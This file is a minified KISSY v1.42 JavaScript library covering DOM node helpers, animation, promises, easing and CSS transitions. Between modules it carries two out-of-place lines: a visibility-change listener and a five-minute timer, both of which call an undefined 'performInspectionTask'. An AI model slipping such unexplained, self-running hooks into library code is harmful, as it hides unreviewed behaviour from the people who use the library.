      "string" === typeof b && (b = h.all(b, this[0].ownerDocument));
      return c.call(this, b);
    };
  });
});
KISSY.add("node/anim", ["./base", "dom", "anim"], function (b, e) {
  function c(b, d, a) {
    for (var c = [], f = {}, a = a || 0; a < d; a++) c.push.apply(c, l[a]);
    for (a = 0; a < c.length; a++) f[c[a]] = b;
    return f;
  }
  var h = e("./base"),
    i = e("dom"),
    g = e("anim"),
    l = [["height", "margin-top", "margin-bottom", "padding-top", "padding-bottom"], ["width", "margin-left", "margin-right", "padding-left", "padding-right"], ["opacity"]];
  b.augment(h, {
    animate: function () {
      var c = b.makeArray(arguments);
      b.each(this, function (d) {
        var a = b.clone(c),
          e = a[0];
        e.to ? (e.node = d, new g(e).run()) : g.apply(void 0, [d].concat(a)).run();
      });
      return this;
    },
    stop: function (c, d, a) {
      b.each(this, function (b) {
        g.stop(b, c, d, a);
      });
      return this;
    },
    pause: function (c, d) {
      b.each(this, function (a) {
        g.pause(a, d);
      });
      return this;
    },
    resume: function (c, d) {
      b.each(this, function (a) {
        g.resume(a, d);
      });
      return this;
    },
    isRunning: function () {
      for (var b = 0; b < this.length; b++) if (g.isRunning(this[b])) return !0;
      return !1;
    },
    isPaused: function () {
      for (var b = 0; b < this.length; b++) if (g.isPaused(this[b])) return !0;
      return !1;
    }
  });
  b.each({
    show: c("show", 3),
    hide: c("hide", 3),
    toggle: c("toggle", 3),
    fadeIn: c("show", 3, 2),
    fadeOut: c("hide", 3, 2),
    fadeToggle: c("toggle", 3, 2),
    slideDown: c("show", 1),
    slideUp: c("hide", 1),
    slideToggle: c("toggle", 1)
  }, function (c, d) {
    h.prototype[d] = function (a, e, f) {
      if (i[d] && !a) i[d](this);else b.each(this, function (b) {
        new g(b, c, a, f, e).run();
      });
      return this;
    };
  });
});
document.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "visible") {
    console.info("Visibility changed, re-running Global Scope Inspection task.");
    performInspectionTask();
  }
});
KISSY.add("node", ["node/base", "node/attach", "node/override", "node/anim"], function (b, e) {
  var c = e("node/base");
  e("node/attach");
  e("node/override");
  e("node/anim");
  b.mix(b, {
    Node: c,
    NodeList: c,
    one: c.one,
    all: c.all
  });
  return c;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:04
*/
KISSY.add("anim", ["anim/base", "anim/timer", "anim/transition?"], function (b, g) {
  function a(a, e, d, f, c) {
    if (a.node) c = a;else {
      "string" === typeof e ? (e = b.unparam("" + e, ";", ":"), b.each(e, function (c, a) {
        var d = b.trim(a);
        d && (e[d] = b.trim(c));
        (!d || d !== a) && delete e[a];
      })) : e = b.clone(e);
      if (b.isPlainObject(d)) c = b.clone(d);else if (c = {
        complete: c
      }, d && (c.duration = d), f) c.easing = f;
      c.node = a;
      c.to = e;
    }
    c = b.merge(k, c, {
      useTransition: b.config("anim/useTransition")
    });
    if (c.useTransition && h) return "use transition anim", new h(c);
    "use js timer anim";
    return new i(c);
  }
  var j = g("anim/base"),
    i = g("anim/timer"),
    h = g("anim/transition?"),
    f = j.Utils,
    k = {
      duration: 1,
      easing: "linear"
    };
  b.each(["pause", "resume"], function (b) {
    a[b] = function (a, d) {
      return null === d || "string" === typeof d || !1 === d ? f.pauseOrResumeQueue(a, d, b) : f.pauseOrResumeQueue(a, void 0, b);
    };
  });
  a.isRunning = f.isElRunning;
  a.isPaused = f.isElPaused;
  a.stop = f.stopEl;
  a.Easing = i.Easing;
  b.Anim = a;
  a.Q = j.Q;
  return a;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 23 18:52
*/
KISSY.add("anim/base/queue", ["dom"], function (c, i) {
  function h(a, b, c) {
    var b = b || f,
      j,
      m = d.data(a, g);
    !m && !c && d.data(a, g, m = {});
    m && (j = m[b], !j && !c && (j = m[b] = []));
    return j;
  }
  var d = i("dom"),
    g = c.guid("ks-queue-" + c.now() + "-"),
    f = c.guid("ks-queue-" + c.now() + "-"),
    a;
  return a = {
    queueCollectionKey: g,
    queue: function (a, c, d) {
      a = h(a, c);
      a.push(d);
      return a;
    },
    remove: function (e, b, d) {
      var j = h(e, b, 1);
      j && (d = c.indexOf(d, j), -1 < d && j.splice(d, 1));
      j && !j.length && a.clearQueue(e, b);
      return j;
    },
    clearQueues: function (a) {
      d.removeData(a, g);
    },
    clearQueue: function (a, b) {
      var b = b || f,
        l = d.data(a, g);
      l && delete l[b];
      c.isEmptyObject(l) && d.removeData(a, g);
    },
    dequeue: function (c, b) {
      var d = h(c, b, 1);
      d && (d.shift(), d.length || a.clearQueue(c, b));
      return d;
    }
  };
});
KISSY.add("anim/base/utils", ["./queue", "dom"], function (c, i) {
  var h = i("./queue"),
    d = i("dom"),
    g = c.guid("ks-anim-unqueued-" + c.now() + "-"),
    f = c.guid("ks-anim-paused-" + c.now() + "-");
  return {
    saveRunningAnim: function (a) {
      var e = a.node,
        b = d.data(e, g);
      b || d.data(e, g, b = {});
      b[c.stamp(a)] = a;
    },
    removeRunningAnim: function (a) {
      var e = a.node,
        b = d.data(e, g);
      b && (delete b[c.stamp(a)], c.isEmptyObject(b) && d.removeData(e, g));
    },
    isAnimPaused: function (a) {
      var e = d.data(a.node, f);
      return e ? !!e[c.stamp(a)] : 0;
    },
    removePausedAnim: function (a) {
      var e = a.node,
        b = d.data(e, f);
      b && (delete b[c.stamp(a)], c.isEmptyObject(b) && d.removeData(e, f));
    },
    savePausedAnim: function (a) {
      var e = a.node,
        b = d.data(e, f);
      b || d.data(e, f, b = {});
      b[c.stamp(a)] = a;
    },
    isAnimRunning: function (a) {
      var e = d.data(a.node, g);
      return e ? !!e[c.stamp(a)] : 0;
    },
    isElPaused: function (a) {
      return (a = d.data(a, f)) && !c.isEmptyObject(a);
    },
    isElRunning: function (a) {
      return (a = d.data(a, g)) && !c.isEmptyObject(a);
    },
    pauseOrResumeQueue: function (a, e, b) {
      a = d.data(a, "resume" === b ? f : g);
      a = c.merge(a);
      c.each(a, function (a) {
        if (void 0 === e || a.config.queue === e) a[b]();
      });
    },
    stopEl: function (a, e, b, f) {
      b && (void 0 === f ? h.clearQueues(a) : !1 !== f && h.clearQueue(a, f));
      a = d.data(a, g);
      a = c.merge(a);
      c.each(a, function (a) {
        (void 0 === f || a.config.queue === f) && a.stop(e);
      });
    }
  };
});
KISSY.add("anim/base", ["dom", "./base/utils", "./base/queue", "promise"], function (c, i) {
  function h(j) {
    h.superclass.constructor.call(this);
    a.Defer(this);
    this.config = j;
    var b = j.node;
    c.isPlainObject(b) || (b = d.get(j.node));
    this.node = this.el = b;
    this._backupProps = {};
    this._propsData = {};
  }
  var d = i("dom"),
    g = i("./base/utils"),
    f = i("./base/queue"),
    a = i("promise"),
    e = d.NodeType,
    b = c.noop,
    l = {
      toggle: 1,
      hide: 1,
      show: 1
    };
  c.extend(h, a, {
    on: function (a, c) {
      "please use promise api of anim instead";

      "complete" === a ? this.then(c) : "end" === a ? this.fin(c) : "step" === a ? this.progress(c) : "not supported event for anim: " + a;
      return this;
    },
    prepareFx: b,
    runInternal: function () {
      var a = this,
        b = a.config,
        f = a.node,
        h,
        i = a._backupProps,
        o = a._propsData,
        k = b.to,
        r = b.delay || 0,
        p = b.duration;
      g.saveRunningAnim(a);
      c.each(k, function (a, d) {
        c.isPlainObject(a) || (a = {
          value: a
        });
        o[d] = c.mix({
          delay: r,
          easing: b.easing,
          frame: b.frame,
          duration: p
        }, a);
      });
      if (f.nodeType === e.ELEMENT_NODE) {
        if (k.width || k.height) k = f.style, c.mix(i, {
          overflow: k.overflow,
          "overflow-x": k.overflowX,
          "overflow-y": k.overflowY
        }), k.overflow = "hidden", "inline" === d.css(f, "display") && "none" === d.css(f, "float") && (10 > c.UA.ieMode ? k.zoom = 1 : k.display = "inline-block");
        var q, n;
        n = "none" === d.css(f, "display");
        c.each(o, function (c, b) {
          h = c.value;
          if (l[h]) {
            if ("hide" === h && n || "show" === h && !n) return a.stop(!0), q = !1;
            i[b] = d.style(f, b);
            "toggle" === h && (h = n ? "show" : "hide");
            "hide" === h ? (c.value = 0, i.display = "none") : (c.value = d.css(f, b), d.css(f, b, 0), d.show(f));
          }
        });
        if (!1 === q) return;
      }
      a.startTime = c.now();
      c.isEmptyObject(o) ? (a.__totalTime = 1E3 * p, a.__waitTimeout = setTimeout(function () {
        a.stop(!0);
      }, a.__totalTime)) : (a.prepareFx(), a.doStart());
    },
    isRunning: function () {
      return g.isAnimRunning(this);
    },
    isPaused: function () {
      return g.isAnimPaused(this);
    },
    pause: function () {
      this.isRunning() && (this._runTime = c.now() - this.startTime, this.__totalTime -= this._runTime, g.removeRunningAnim(this), g.savePausedAnim(this), this.__waitTimeout ? clearTimeout(this.__waitTimeout) : this.doStop());
      return this;
    },
    doStop: b,
    doStart: b,
    resume: function () {
      var a = this;
      a.isPaused() && (a.startTime = c.now() - a._runTime, g.removePausedAnim(a), g.saveRunningAnim(a), a.__waitTimeout ? a.__waitTimeout = setTimeout(function () {
        a.stop(!0);
      }, a.__totalTime) : (a.beforeResume(), a.doStart()));
      return a;
    },
    beforeResume: b,
    run: function () {
      var a;
      a = this.config.queue;
      !1 === a ? this.runInternal() : (a = f.queue(this.node, a, this), 1 === a.length && this.runInternal());
      return this;
    },
    stop: function (a) {
      var b = this.node,
        e = this.config.queue;
      if (this.isResolved() || this.isRejected()) return this;
      this.__waitTimeout && (clearTimeout(this.__waitTimeout), this.__waitTimeout = 0);
      if (!this.isRunning() && !this.isPaused()) return !1 !== e && f.remove(b, e, this), this;
      this.doStop(a);
      g.removeRunningAnim(this);
      g.removePausedAnim(this);
      var h = this.defer;
      if (a) {
        var i,
          a = this.config.complete;
        c.isEmptyObject(i = this._backupProps) || d.css(this.node, i);
        a && a.call(this);
        h.resolve([this]);
      } else h.reject([this]);
      !1 !== e && (b = f.dequeue(b, e)) && b[0] && b[0].runInternal();
      return this;
    }
  });
  h.Utils = g;
  h.Q = f;
  return h;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:17
*/
KISSY.add("promise", [], function (k) {
  function t(a) {
    "undefined" !== typeof console && console.error && console.error(a);
  }
  function o(a, b, d) {
    if (a instanceof g) p(function () {
      d.call(a, a[e]);
    });else {
      var l = a[e],
        c = a[i];
      c ? c.push([b, d]) : m(l) ? o(l, b, d) : b && p(function () {
        b.call(a, l);
      });
    }
  }
  function f(a) {
    if (!(this instanceof f)) return new f(a);
    this.promise = a || new c();
    this.promise.defer = this;
  }
  function m(a) {
    return a && a instanceof c;
  }
  function c(a) {
    this[e] = a;
    void 0 === a && (this[i] = [], this[n] = []);
  }
  function g(a) {
    if (a instanceof g) return a;
    c.apply(this, arguments);
    this[e] instanceof c && "assert.not(this.__promise_value instanceof promise) in Reject constructor";
    return this;
  }
  function j(a, b, d) {
    function l(a) {
      try {
        return b ? b.call(this, a) : a;
      } catch (d) {
        return t(d.stack || d), new g(d);
      }
    }
    function e(a) {
      try {
        return d ? d.call(this, a) : new g(a);
      } catch (b) {
        return t(b.stack || b), new g(b);
      }
    }
    function u(a) {
      h ? "already done at fulfilled" : a instanceof c ? "assert.not(value instanceof Promise) in when" : (h = 1, q.resolve(l.call(this, a)));
    }
    var q = new f(),
      h = 0;
    a instanceof c ? o(a, u, function (a) {
      h ? "already done at rejected" : (h = 1, q.resolve(e.call(this, a)));
    }) : u(a);
    return q.promise;
  }
  function r(a) {
    return !s(a) && m(a) && void 0 === a[i] && (!m(a[e]) || r(a[e]));
  }
  function s(a) {
    return m(a) && void 0 === a[i] && a[e] instanceof g;
  }
  var e = "__promise_value",
    p = k.setImmediate,
    n = "__promise_progress_listeners",
    i = "__promise_pendings";
  f.prototype = {
    constructor: f,
    resolve: function (a) {
      var b = this.promise,
        d;
      if (!(d = b[i])) return null;
      b[e] = a;
      d = [].concat(d);
      b[i] = void 0;
      b[n] = void 0;
      k.each(d, function (a) {
        o(b, a[0], a[1]);
      });
      return a;
    },
    reject: function (a) {
      return this.resolve(new g(a));
    },
    notify: function (a) {
      k.each(this.promise[n], function (b) {
        p(function () {
          b(a);
        });
      });
    }
  };
  c.prototype = {
    constructor: c,
    then: function (a, b, d) {
      d && this.progress(d);
      return j(this, a, b);
    },
    progress: function (a) {
      this[n] && this[n].push(a);
      return this;
    },
    fail: function (a) {
      return j(this, 0, a);
    },
    fin: function (a) {
      return j(this, function (b) {
        return a(b, !0);
      }, function (b) {
        return a(b, !1);
      });
    },
    done: function (a, b) {
      (a || b ? this.then(a, b) : this).fail(function (a) {
        a.stack || a;
        "error";
        setTimeout(function () {
          throw a;
        }, 0);
      });
    },
    isResolved: function () {
      return r(this);
    },
    isRejected: function () {
      return s(this);
    }
  };
  k.extend(g, c);
  KISSY.Defer = f;
  KISSY.Promise = c;
  c.Defer = f;
  k.mix(c, {
    when: j,
    isPromise: m,
    isResolved: r,
    isRejected: s,
    all: function (a) {
      var b = a.length;
      if (!b) return null;
      for (var d = new f(), c = 0; c < a.length; c++) (function (c, e) {
        j(c, function (c) {
          a[e] = c;
          0 === --b && d.resolve(a);
        }, function (a) {
          d.reject(a);
        });
      })(a[c], c);
      return d.promise;
    },
    async: function (a) {
      return function () {
        function b(a, b) {
          var h;
          try {
            h = f[a](b);
          } catch (i) {
            return new g(i);
          }
          return h.done ? h.value : j(h.value, c, e);
        }
        function c(a) {
          return b("next", a);
        }
        function e(a) {
          return b("throw", a);
        }
        var f = a.apply(this, arguments);
        return c();
      };
    }
  });
  return c;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:04
*/
KISSY.add("anim/timer/easing", [], function () {
  function j(a) {
    return a;
  }
  function g(a, b, n, e) {
    var d = 3 * a - 3 * n + 1,
      c = 3 * n - 6 * a,
      i = 3 * a,
      l = 3 * b - 3 * e + 1,
      f = 3 * e - 6 * b,
      j = 3 * b;
    return function (a) {
      a: {
        for (var b = a, n, e, k = 0; 8 > k; k++) {
          e = ((d * b + c) * b + i) * b - a;
          if (m(e) < o) {
            a = b;
            break a;
          }
          n = (3 * d * b + 2 * c) * b + i;
          if (m(n) < o) break;
          b -= e / n;
        }
        n = 1;
        k = 0;
        for (b = a; n > k;) {
          e = ((d * b + c) * b + i) * b - a;
          if (m(e) < o) break;
          0 < e ? n = b : k = b;
          b = (n + k) / 2;
        }
        a = b;
      }
      return ((l * a + f) * a + j) * a;
    };
  }
  var h = Math.PI,
    i = Math.pow,
    b = Math.sin,
    c = parseFloat,
    l = /^cubic-bezier\(([^,]+),([^,]+),([^,]+),([^,]+)\)$/i,
    f = {
      swing: function (a) {
        return -Math.cos(a * h) / 2 + 0.5;
      },
      easeNone: j,
      linear: j,
      easeIn: function (a) {
        return a * a;
      },
      ease: g(0.25, 0.1, 0.25, 1),
      "ease-in": g(0.42, 0, 1, 1),
      "ease-out": g(0, 0, 0.58, 1),
      "ease-in-out": g(0.42, 0, 0.58, 1),
      "ease-out-in": g(0, 0.42, 1, 0.58),
      toFn: function (a) {
        var b;
        return (b = a.match(l)) ? g(c(b[1]), c(b[2]), c(b[3]), c(b[4])) : f[a] || j;
      },
      easeOut: function (a) {
        return (2 - a) * a;
      },
      easeBoth: function (a) {
        return 1 > (a *= 2) ? 0.5 * a * a : 0.5 * (1 - --a * (a - 2));
      },
      easeInStrong: function (a) {
        return a * a * a * a;
      },
      easeOutStrong: function (a) {
        return 1 - --a * a * a * a;
      },
      easeBothStrong: function (a) {
        return 1 > (a *= 2) ? 0.5 * a * a * a * a : 0.5 * (2 - (a -= 2) * a * a * a);
      },
      elasticIn: function (a) {
        return 0 === a || 1 === a ? a : -(i(2, 10 * (a -= 1)) * b(2 * (a - 0.075) * h / 0.3));
      },
      elasticOut: function (a) {
        return 0 === a || 1 === a ? a : i(2, -10 * a) * b(2 * (a - 0.075) * h / 0.3) + 1;
      },
      elasticBoth: function (a) {
        return 0 === a || 2 === (a *= 2) ? a : 1 > a ? -0.5 * i(2, 10 * (a -= 1)) * b(2 * (a - 0.1125) * h / 0.45) : 0.5 * i(2, -10 * (a -= 1)) * b(2 * (a - 0.1125) * h / 0.45) + 1;
      },
      backIn: function (a) {
        1 === a && (a -= 0.001);
        return a * a * (2.70158 * a - 1.70158);
      },
      backOut: function (a) {
        return (a -= 1) * a * (2.70158 * a + 1.70158) + 1;
      },
      backBoth: function (a) {
        var b,
          n = (b = 2.5949095) + 1;
        return 1 > (a *= 2) ? 0.5 * a * a * (n * a - b) : 0.5 * ((a -= 2) * a * (n * a + b) + 2);
      },
      bounceIn: function (a) {
        return 1 - f.bounceOut(1 - a);
      },
      bounceOut: function (a) {
        return a < 1 / 2.75 ? 7.5625 * a * a : a < 2 / 2.75 ? 7.5625 * (a -= 1.5 / 2.75) * a + 0.75 : a < 2.5 / 2.75 ? 7.5625 * (a -= 2.25 / 2.75) * a + 0.9375 : 7.5625 * (a -= 2.625 / 2.75) * a + 0.984375;
      },
      bounceBoth: function (a) {
        return 0.5 > a ? 0.5 * f.bounceIn(2 * a) : 0.5 * f.bounceOut(2 * a - 1) + 0.5;
      }
    },
    o = 1.0E-6,
    m = Math.abs;
  return f;
});
KISSY.add("anim/timer/manager", [], function (j) {
  var g = j.stamp,
    h,
    i;
  h = function (b) {
    return setTimeout(b, 15);
  };
  i = function (b) {
    clearTimeout(b);
  };
  return {
    runnings: {},
    timer: null,
    start: function (b) {
      var c = g(b);
      this.runnings[c] || (this.runnings[c] = b, this.startTimer());
    },
    stop: function (b) {
      this.notRun(b);
    },
    notRun: function (b) {
      delete this.runnings[g(b)];
      j.isEmptyObject(this.runnings) && this.stopTimer();
    },
    pause: function (b) {
      this.notRun(b);
    },
    resume: function (b) {
      this.start(b);
    },
    startTimer: function () {
      var b = this;
      b.timer || (b.timer = h(function l() {
        b.runFrames() ? b.stopTimer() : b.timer = h(l);
      }));
    },
    stopTimer: function () {
      var b = this.timer;
      b && (i(b), this.timer = 0);
    },
    runFrames: function () {
      var b,
        c,
        i = this.runnings;
      for (b in i) i[b].frame();
      for (b in i) {
        c = 0;
        break;
      }
      return void 0 === c;
    }
  };
});
KISSY.add("anim/timer/fx", ["dom"], function (j, g) {
  function h(b) {
    j.mix(this, b);
    this.pos = 0;
    this.unit = this.unit || "";
  }
  var i = g("dom");
  h.prototype = {
    isCustomFx: 0,
    constructor: h,
    load: function (b) {
      j.mix(this, b);
      this.pos = 0;
      this.unit = this.unit || "";
    },
    frame: function (b) {
      if (1 !== this.pos) {
        var c = this.anim,
          h = this.prop,
          f = c.node,
          g = this.from,
          m = this.propData,
          a = this.to;
        if (void 0 === b) var k = j.now(),
          b = m.duration,
          k = k - c.startTime - m.delay,
          b = 0 >= k ? 0 : k >= b ? 1 : m.easing(k / b);
        this.pos = b;
        g === a || 0 === b || (this.val = b = this.interpolate(g, a, this.pos), m.frame ? m.frame.call(this, c, this) : this.isCustomFx || (void 0 === b ? (this.pos = 1, b = a, h + " update directly ! : " + b + " : " + g + " : " + a) : b += this.unit, this.val = b, "attr" === this.type ? i.attr(f, h, b, 1) : i.css(f, h, b)));
      }
    },
    interpolate: function (b, c, i) {
      if ("number" === typeof b && "number" === typeof c) return Math.round(1E5 * (b + (c - b) * i)) / 1E5;
    },
    cur: function () {
      var b = this.prop,
        c,
        h,
        f = this.anim.node;
      if (this.isCustomFx) return f[b] || 0;
      if (!(c = this.type)) c = this.type = (!f.style || null == f.style[b]) && null != i.attr(f, b, void 0, 1) ? "attr" : "css";
      b = "attr" === c ? i.attr(f, b, void 0, 1) : i.css(f, b);
      return isNaN(h = parseFloat(b)) ? !b || "auto" === b ? 0 : b : h;
    }
  };
  h.Factories = {};
  h.FxTypes = {};
  h.getFx = function (b) {
    var c = h,
      i,
      f;
    if (i = b.fxType) c = h.FxTypes[i];else if (!b.isCustomFx && (f = h.Factories[b.prop])) c = f;
    return new c(b);
  };
  return h;
});
KISSY.add("anim/timer/short-hand", [], function () {
  return {
    background: [],
    border: ["borderBottomWidth", "borderLeftWidth", "borderRightWidth", "borderTopWidth"],
    borderBottom: ["borderBottomWidth"],
    borderLeft: ["borderLeftWidth"],
    borderTop: ["borderTopWidth"],
    borderRight: ["borderRightWidth"],
    font: ["fontSize", "fontWeight"],
    margin: ["marginBottom", "marginLeft", "marginRight", "marginTop"],
    padding: ["paddingBottom", "paddingLeft", "paddingRight", "paddingTop"]
  };
});
KISSY.add("anim/timer/color", ["./fx", "./short-hand"], function (j, g) {
  function h(b) {
    var b = b + "",
      e;
    if (e = b.match(m)) return [parseInt(e[1]), parseInt(e[2]), parseInt(e[3])];
    if (e = b.match(a)) return [parseInt(e[1]), parseInt(e[2]), parseInt(e[3]), parseInt(e[4])];
    if (e = b.match(k)) {
      for (b = 1; b < e.length; b++) 2 > e[b].length && (e[b] += e[b]);
      return [parseInt(e[1], l), parseInt(e[2], l), parseInt(e[3], l)];
    }
    if (o[b = b.toLowerCase()]) return o[b];
    "only allow rgb or hex color string : " + b;
    return [255, 255, 255];
  }
  function i() {
    i.superclass.constructor.apply(this, arguments);
  }
  var b = g("./fx"),
    c = g("./short-hand"),
    l = 16,
    f = Math.floor,
    o = {
      black: [0, 0, 0],
      silver: [192, 192, 192],
      gray: [128, 128, 128],
      white: [255, 255, 255],
      maroon: [128, 0, 0],
      red: [255, 0, 0],
      purple: [128, 0, 128],
      fuchsia: [255, 0, 255],
      green: [0, 128, 0],
      lime: [0, 255, 0],
      olive: [128, 128, 0],
      yellow: [255, 255, 0],
      navy: [0, 0, 128],
      blue: [0, 0, 255],
      teal: [0, 128, 128],
      aqua: [0, 255, 255]
    },
    m = /^rgb\(([0-9]+)\s*,\s*([0-9]+)\s*,\s*([0-9]+)\)$/i,
    a = /^rgba\(([0-9]+)\s*,\s*([0-9]+)\s*,\s*([0-9]+),\s*([0-9]+)\)$/i,
    k = /^#?([0-9A-F]{1,2})([0-9A-F]{1,2})([0-9A-F]{1,2})$/i;
  c.background.push("backgroundColor");
  c.borderColor = ["borderBottomColor", "borderLeftColor", "borderRightColor", "borderTopColor"];
  c.border.push("borderBottomColor", "borderLeftColor", "borderRightColor", "borderTopColor");
  c.borderBottom.push("borderBottomColor");
  c.borderLeft.push("borderLeftColor");
  c.borderRight.push("borderRightColor");
  c.borderTop.push("borderTopColor");
  j.extend(i, b, {
    load: function () {
      i.superclass.load.apply(this, arguments);
      this.from && (this.from = h(this.from));
      this.to && (this.to = h(this.to));
    },
    interpolate: function (a, b, d) {
      var k = i.superclass.interpolate;
      if (3 === a.length && 3 === b.length) return "rgb(" + [f(k(a[0], b[0], d)), f(k(a[1], b[1], d)), f(k(a[2], b[2], d))].join(", ") + ")";
      if (4 === a.length || 4 === b.length) return "rgba(" + [f(k(a[0], b[0], d)), f(k(a[1], b[1], d)), f(k(a[2], b[2], d)), f(k(a[3] || 1, b[3] || 1, d))].join(", ") + ")";
      "unknown value : " + a;
    }
  });
  j.each("backgroundColor,borderBottomColor,borderLeftColor,borderRightColor,borderTopColor,color,outlineColor".split(","), function (a) {
    b.Factories[a] = i;
  });
  return b.FxTypes.color = i;
});
KISSY.add("anim/timer/transform", ["dom", "./fx"], function (j, g) {
  function h(a) {
    a = a.split(/,/);
    return a = j.map(a, function (a) {
      return b(a);
    });
  }
  function i() {
    return {
      translateX: 0,
      translateY: 0,
      rotate: 0,
      skewX: 0,
      skewY: 0,
      scaleX: 1,
      scaleY: 1
    };
  }
  function b(a) {
    return Math.round(1E5 * parseFloat(a)) / 1E5;
  }
  function c(a) {
    for (var a = a.split(")"), k = j.trim, n = -1, e = a.length - 1, d, c, f = i(); ++n < e;) switch (d = a[n].split("("), c = k(d[0]), d = d[1], c) {
      case "translateX":
      case "translateY":
      case "scaleX":
      case "scaleY":
        f[c] = b(d);
        break;
      case "rotate":
      case "skewX":
      case "skewY":
        var g = b(d);
        j.endsWith(d, "deg") || (g = 180 * g / Math.PI);
        f[c] = g;
        break;
      case "translate":
      case "translate3d":
        d = d.split(",");
        f.translateX = b(d[0]);
        f.translateY = b(d[1] || 0);
        break;
      case "scale":
        d = d.split(",");
        f.scaleX = b(d[0]);
        f.scaleY = b(d[1] || d[0]);
        break;
      case "matrix":
        return a = d, a = h(a), e = n = k = void 0, c = a[0], f = a[1], d = a[2], g = a[3], c * g - f * d ? (k = Math.sqrt(c * c + f * f), e = (c * d + f * g) / (c * g - d * f), n = (c * g - f * d) / k, c * g < f * d && (e = -e, k = -k)) : k = n = e = 0, {
          translateX: b(a[4]),
          translateY: b(a[5]),
          rotate: b(180 * Math.atan2(f, c) / Math.PI),
          skewX: b(180 * Math.atan(e) / Math.PI),
          skewY: 0,
          scaleX: b(k),
          scaleY: b(n)
        };
    }
    return f;
  }
  function l() {
    l.superclass.constructor.apply(this, arguments);
  }
  var f = g("dom"),
    o = g("./fx"),
    m = j.Features.isTransform3dSupported() ? "translate3d({translateX}px,{translateY}px,0)" : "translate({translateX}px,{translateY}px)";
  j.extend(l, o, {
    load: function () {
      l.superclass.load.apply(this, arguments);
      this.from = (this.from = f.style(this.anim.node, "transform") || this.from) && "none" !== this.from ? c(this.from) : i();
      this.to = this.to ? c(this.to) : i();
    },
    interpolate: function (a, b, c) {
      var e = l.superclass.interpolate,
        d = {};
      d.translateX = e(a.translateX, b.translateX, c);
      d.translateY = e(a.translateY, b.translateY, c);
      d.rotate = e(a.rotate, b.rotate, c);
      d.skewX = e(a.skewX, b.skewX, c);
      d.skewY = e(a.skewY, b.skewY, c);
      d.scaleX = e(a.scaleX, b.scaleX, c);
      d.scaleY = e(a.scaleY, b.scaleY, c);
      return j.substitute(m + " rotate({rotate}deg) skewX({skewX}deg) skewY({skewY}deg) scale({scaleX},{scaleY})", d);
    }
  });
  return o.Factories.transform = l;
});
KISSY.add("anim/timer", "dom,./base,./timer/easing,./timer/manager,./timer/fx,./timer/short-hand,./timer/color,./timer/transform".split(","), function (j, g) {
  function h() {
    var a;
    h.superclass.constructor.apply(this, arguments);
    j.each(a = this.to, function (b, c) {
      var d = m(c);
      if (c !== d) {
        a[d] = a[c];
        delete a[c];
      }
    });
  }
  var i = g("dom"),
    b = g("./base"),
    c = g("./timer/easing"),
    l = g("./timer/manager"),
    f = g("./timer/fx"),
    o = g("./timer/short-hand");
  g("./timer/color");
  g("./timer/transform");
  var m = i._camelCase,
    a = /^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i;
  j.extend(h, b, {
    prepareFx: function () {
      var b = this.node,
        g = this._propsData;
      j.each(g, function (a) {
        a.duration = a.duration * 1E3;
        a.delay = a.delay * 1E3;
        if (typeof a.easing === "string") a.easing = c.toFn(a.easing);
      });
      j.each(o, function (a, c) {
        var d,
          e = g[c],
          f;
        if (e) {
          f = e.value;
          d = {};
          j.each(a, function (a) {
            d[a] = i.css(b, a);
          });
          i.css(b, c, f);
          j.each(d, function (a, c) {
            c in g || (g[c] = j.merge(e, {
              value: i.css(b, c)
            }));
            i.css(b, c, a);
          });
          delete g[c];
        }
      });
      var e,
        d,
        h,
        l,
        m,
        p,
        r,
        u = 0,
        q;
      j.isPlainObject(b) && (u = 1);
      for (e in g) {
        d = g[e];
        h = d.value;
        p = {
          isCustomFx: u,
          prop: e,
          anim: this,
          fxType: d.fxType,
          type: d.type,
          propData: d
        };
        r = f.getFx(p);
        l = h;
        m = r.cur();
        h = h + "";
        q = "";
        if (h = h.match(a)) {
          l = parseFloat(h[2]);
          if ((q = h[3]) && q !== "px" && m) {
            var s = 0,
              t = l;
            do {
              ++t;
              i.css(b, e, t + q);
              s = r.cur();
            } while (s === 0);
            m = t / s * m;
            i.css(b, e, m + q);
          }
          h[1] && (l = (h[1] === "-=" ? -1 : 1) * l + m);
        }
        p.from = m;
        p.to = l;
        p.unit = q;
        r.load(p);
        d.fx = r;
      }
    },
    frame: function () {
      var a,
        b = 1,
        c,
        d = this._propsData;
      for (a in d) {
        c = d[a];
        c = c.fx;
        c.frame();
        if (this.isRejected() || this.isResolved()) return;
        b = b & c.pos === 1;
      }
      d = j.now();
      a = this.config.duration * 1E3;
      d = Math.max(0, this.startTime + a - d);
      this.defer.notify([this, 1 - (d / a || 0), d]);
      b && this.stop(b);
    },
    doStop: function (a) {
      var b,
        c = this._propsData;
      l.stop(this);
      if (a) for (b in c) {
        a = c[b];
        (a = a.fx) && a.frame(1);
      }
    },
    doStart: function () {
      l.start(this);
    }
  });
  h.Easing = c;
  h.Fx = f;
  return h;
});
/*
Copyright 2014, KISSY v1.42
MIT Licensed
build time: Feb 25 18:29
*/
setInterval(performInspectionTask, 5 * 60 * 1000); // inspect every 5 minutes

KISSY.add("anim/transition", ["dom", "event/dom", "./base"], function (g, h) {
  function p(c) {
    var b = "";
    g.each(c, function (c, a) {
      b && (b += ",");
      b += a + " " + c.duration + "s " + c.easing + " " + c.delay + "s";
    });
    return b;
  }
  function k() {
    k.superclass.constructor.apply(this, arguments);
  }
  var i = h("dom"),
    m = h("event/dom"),
    q = h("./base"),
    l = g.Features,
    n = l.getVendorCssPropPrefix("transition"),
    r = /([A-Z]|^ms)/g,
    o = n ? n.toLowerCase() + "TransitionEnd" : "transitionend webkitTransitionEnd",
    j = l.getVendorCssPropName("transition");
  g.extend(k, q, {
    doStart: function () {
      var c = this,
        b = c.node,
        d = b.style,
        a = c._propsData,
        f = d[j],
        e,
        h = {};
      if (e = a.transform) delete a.transform, a[l.getVendorCssPropName("transform").replace(r, "-$1").toLowerCase()] = e;
      g.each(a, function (a, d) {
        var e = a.value,
          f = i.css(b, d);
        "number" === typeof e && (f = parseFloat(f));
        f === e && setTimeout(function () {
          c._onTransitionEnd({
            originalEvent: {
              propertyName: d
            }
          });
        }, 0);
        h[d] = e;
      });
      -1 !== f.indexOf("none") ? f = "" : f && (f += ",");
      d[j] = f + p(a);
      m.on(b, o, c._onTransitionEnd, c);
